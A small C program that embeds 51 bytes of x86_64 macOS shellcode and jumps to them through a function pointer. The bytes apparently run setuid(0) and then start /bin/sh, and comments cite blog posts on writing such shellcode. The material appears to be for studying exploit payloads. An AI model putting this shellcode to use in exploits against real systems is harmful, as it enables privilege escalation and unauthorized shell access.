#include <unistd.h>

// Shell code from:
//   http://dustin.schultz.io/blog/2010/11/25/51-byte-x86_64-os-x-null-free-shellcode/
//   See also: http://ligocki.tumblr.com/post/5174133459/writing-shellcode-under-mac-os-x-part-0x01

// const is important. Without const, you'll get a "Bus error", a.k.a. "Segmentation fault",
//  i.e., a violation of a memory page's declared purpose (executable or not).
const char shellcode[] =
     "\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17\x31\xff\x4c\x89\xc0"
     "\x0f\x05\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52"
     "\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff\x2f\x62\x69\x6e\x2f"
     "\x2f\x73\x68";

int main()
{
     void (*f)(void);
     f = ( void (*)(void) ) shellcode;  // convert the byte array pointer to the function pointer
     f();                               // call the functon
}

